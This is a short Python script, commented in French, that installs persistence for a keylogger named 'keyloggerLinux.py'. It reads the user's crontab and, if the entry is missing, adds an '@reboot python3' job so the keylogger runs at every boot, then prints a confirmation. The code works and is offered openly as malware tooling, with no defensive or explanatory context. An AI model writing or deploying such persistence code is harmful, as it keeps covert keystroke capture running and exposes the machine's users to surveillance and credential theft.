import os
import subprocess

# Chemin vers le script Python
python_script = "keyloggerLinux.py"

# Commande crontab pour exécuter le script Python au démarrage
cron_job = f"@reboot python3 {python_script}"

# Obtenir la crontab actuelle de l'utilisateur
current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)

# Vérifier si le script est déjà dans la crontab
if cron_job not in current_cron.stdout:
    # Ajouter la nouvelle tâche à crontab
    new_cron = current_cron.stdout + cron_job + "\n"
    subprocess.run(['crontab', '-'], input=new_cron, text=True)
    print("Le script Python a été ajouté à crontab pour être exécuté au démarrage.")
else:
    print("Le script Python est déjà dans crontab.")
